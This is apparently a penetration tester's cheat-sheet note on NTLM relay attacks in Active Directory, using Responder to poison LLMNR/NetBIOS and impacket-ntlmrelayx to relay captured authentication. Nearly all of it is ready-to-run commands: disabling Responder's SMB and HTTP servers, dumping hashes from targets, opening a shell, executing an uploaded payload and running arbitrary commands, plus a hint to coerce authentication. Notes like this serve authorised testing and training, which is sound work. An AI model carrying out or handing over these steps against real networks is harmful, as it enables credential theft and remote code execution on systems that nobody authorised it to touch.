---
tags:
  - Initial-Access
  - LLMNR
  - NETBIOS
  - SMB
  - AD
---
Relay captures hashes to target machine for various types of access.
- Only works if SMB signing is disabled or "not required"
- Relayed creds MUST be admin on the machine
## Responder + ntlmrelayx
---

Edit responder conf:
```bash
sudo nano /etc/responder/Responder.conf
SMB = On ---> Off
HTTP = on ---> Off
```
Make targets list
```bash
echo "<TargetIP>" > targets.txt
```
Run responder
```bash
sudo responder -I eth0 -wv
```
Start ntlmrelayx with any of these options
**Dump hashes**
```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support
```
**Get semi-interactive smbexec bind shell** (`nc localhost 11000`)
```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i
```
**Execute payload**
```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -e payload.exe
```
**Execute Command**
```bash
sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'
```
Wait for auth attempt (or coerce auth attempt)
